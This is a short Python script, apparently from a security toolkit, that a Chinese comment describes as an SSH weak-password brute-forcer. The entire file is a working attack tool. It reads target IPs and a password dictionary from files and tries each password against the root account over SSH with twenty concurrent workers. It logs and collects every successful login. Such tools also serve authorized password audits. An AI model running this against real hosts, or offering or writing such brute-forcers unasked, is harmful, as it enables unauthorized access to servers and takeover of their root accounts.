# -*- coding: utf-8 -*-
# Created by restran on 2016/10/10
from __future__ import unicode_literals, absolute_import

"""
# 加上gevent的monkey.patch_all()，不然会出现如下错误
# Paramiko fails to connect due to greenlet error 'This operation would block forever'
"""
from gevent import monkey

monkey.patch_all()

import logging
import traceback
import paramiko
import os
import sys

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import read_dict, TaskExecutor

logger = logging.getLogger(__name__)

"""
ssh 弱口令爆破
"""

ip_list = read_dict('ip.txt', clear_none=True)
username_list = ['root']
found_password = []


def weak_pass(password, ip, port=22, timeout=5):
    for name in username_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port, str(name), str(password), timeout=timeout)
            found_password.append((ip, password))
            logger.warning('[True ] %s %s:%s' % (ip, name, password))
            return True
        except Exception as e:
            logger.info(e)
            logger.info('[False] %s %s:%s' % (ip, name, password))

    return False


def main():
    password_list = read_dict('password.dic')
    for ip in ip_list:
        executor = TaskExecutor(password_list, max_workers=20)
        executor.run(weak_pass, ip)

    for t in found_password:
        logger.info('%s password is %s' % t)


if __name__ == '__main__':
    main()
